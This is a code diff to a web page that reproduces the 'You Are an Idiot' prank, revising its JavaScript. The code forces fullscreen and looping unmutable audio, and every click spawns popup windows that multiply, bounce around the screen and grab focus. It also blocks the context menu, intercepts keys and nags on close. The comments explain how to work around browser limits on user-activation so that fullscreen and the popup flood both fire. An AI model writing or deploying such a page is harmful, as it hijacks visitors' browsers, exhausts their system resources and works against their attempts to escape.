@@ -741,24 +741,23 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
   var snd = document.getElementById("snd");
   var isPopup = !!window.opener;
 
-  // Audio: play by default, loop forever, no mute. Main window only (popups stay
-  // silent so dozens of windows don't become an audio avalanche). Browsers block
-  // autoplay-with-sound until a gesture, so we also start it on the first one.
+  // The song: autoplay + loop, no mute. Main window only (popups stay silent so
+  // many windows don't stack audio). Browsers block autoplay-with-sound until a
+  // gesture, so it really starts on the first interaction.
   function playAudio(){ if(isPopup) return; try{ var p=snd.play(); if(p&&p.catch) p.catch(function(){}); }catch(e){} }
 
-  // Auto-fullscreen (main window only; needs a user gesture).
-  function goFs(){
-    if(isPopup || document.fullscreenElement || document.webkitFullscreenElement) return;
+  function goFullscreen(){
+    if(document.fullscreenElement||document.webkitFullscreenElement) return;
     var el=document.documentElement;
     var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen;
     if(fn){ try{ var p=fn.call(el); if(p&&p.catch) p.catch(function(){}); }catch(e){} }
   }
 
-  // Popups: each click opens more windows of this same page.
+  // Each click opens more windows of this same page.
   function openWindow(){ try{ window.open("/","_blank","menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=357,height=330"); }catch(e){} }
-  async function proCreate(n){ for(var i=0;i<n;i++){ openWindow(); await new Promise(function(r){ setTimeout(r,50); }); } }
+  function proCreate(n){ for(var i=0;i<n;i++) openWindow(); }
 
-  // Bounce this window around the screen (works for script-opened popups).
+  // Bounce this window around the screen (script-opened popups can be moved).
   var xOff=5,yOff=5,xPos=400,yPos=-100;
   function newXlt(){ xOff=Math.ceil(-6*Math.random())*5-10; window.focus(); }
   function newXrt(){ xOff=Math.ceil(7*Math.random())*5-10; }
@@ -774,13 +773,28 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
     setTimeout(playBall,10);
   }
 
-  function onGesture(){ playAudio(); goFs(); }
-  var evs=["pointerdown","touchstart","keydown","click"],i;
-  for(i=0;i<evs.length;i++) window.addEventListener(evs[i],onGesture,true);
+  if(isPopup){
+    // Popups: silent, bounce, and each click spawns 3 more.
+    window.addEventListener("load", playBall);
+    document.addEventListener("click", function(){ proCreate(3); });
+  } else {
+    // Main window. A browser allows only ONE activation-consuming action per
+    // click, so fullscreen and window.open cannot both fire on the same click.
+    // Therefore: the FIRST interaction arms fullscreen + the song, and EVERY
+    // click after that spawns popups.
+    var armed=false;
+    function arm(){ if(armed) return; armed=true; playAudio(); goFullscreen(); }
+    window.addEventListener("pointerdown", arm, true);
+    window.addEventListener("touchstart", arm, true);
+    window.addEventListener("keydown", arm, true);
+    document.addEventListener("click", function(){ if(armed) proCreate(6); else arm(); });
+  }
 
-  window.addEventListener("load",function(){ playAudio(); if(isPopup) playBall(); });
-  document.addEventListener("click",function(){ proCreate(isPopup?3:6); });
+  // Optimistic immediate attempt (usually blocked until the gesture above).
+  window.addEventListener("load", playAudio);
 
+  // Close-nag. NOTE: modern browsers show their own generic text and ignore this
+  // string, so it cannot say "Are you an idiot?".
   window.onbeforeunload=function(){ return "Are you an idiot?"; };
   window.oncontextmenu=function(){ return false; };
   window.onkeydown=function(e){
